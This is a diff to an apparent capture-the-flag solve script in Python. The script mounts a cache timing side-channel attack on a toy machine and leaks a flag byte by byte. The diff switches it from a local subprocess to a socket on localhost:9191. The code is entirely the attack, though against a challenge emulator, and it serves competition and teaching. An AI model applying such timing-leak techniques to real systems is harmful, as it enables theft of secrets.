@@ -1,35 +1,34 @@
-import subprocess
+import socket
 
 MEM_SIZE = 256
 CACHE_SIZE = 32
 
 
-def issue_cmd(proc, cmd):
-    proc.stdin.write('{}\n'.format(cmd))
-    proc.stdin.flush()
-    return float(proc.stdout.readline().strip())
+def issue_cmd(sock, cmd):
+    sock.sendall('{}\n'.format(cmd))
+    return float(sock.recv(4096).strip())
 
 
-def get_flag(proc):
+def get_flag(sock):
     flag = []
     for addr in range(256):
         curr_base = 0
-        issue_cmd(proc, 'mvl a {}'.format(addr))
-        issue_cmd(proc, 'ldi b a')
-        issue_cmd(proc, 'clear')
+        issue_cmd(sock, 'mvl a {}'.format(addr))
+        issue_cmd(sock, 'ldi b a')
+        issue_cmd(sock, 'clear')
         while (curr_base + CACHE_SIZE) < MEM_SIZE:
             for index in range(CACHE_SIZE):
                 guess = curr_base + index
-                issue_cmd(proc, 'ld d {}'.format(guess))
-            x = issue_cmd(proc, 'ldi c b')
+                issue_cmd(sock, 'ld d {}'.format(guess))
+            x = issue_cmd(sock, 'ldi c b')
             if x < .05:
                 for index in range(CACHE_SIZE):
                     guess = index + curr_base
-                    issue_cmd(proc, 'mvl a {}'.format(addr))
-                    issue_cmd(proc, 'ldi b a')
-                    issue_cmd(proc, 'clear')
-                    issue_cmd(proc, 'ldi c b')
-                    x = issue_cmd(proc, 'ld d {}'.format(guess))
+                    issue_cmd(sock, 'mvl a {}'.format(addr))
+                    issue_cmd(sock, 'ldi b a')
+                    issue_cmd(sock, 'clear')
+                    issue_cmd(sock, 'ldi c b')
+                    x = issue_cmd(sock, 'ld d {}'.format(guess))
                     if x < .05:
                         if guess == 0:
                             return ''.join(flag)
@@ -41,12 +40,9 @@ def get_flag(proc):
 
 
 def main():
-    proc = subprocess.Popen(['python', './cache.py'], stdin=subprocess.PIPE,
-                            stdout=subprocess.PIPE)
-    flag = get_flag(proc)
-    print(flag)
-    proc.kill()
-
+    sock = socket.socket()
+    sock.connect(('localhost', 9191))
+    flag = get_flag(sock)
 
 if __name__ == '__main__':
     main()
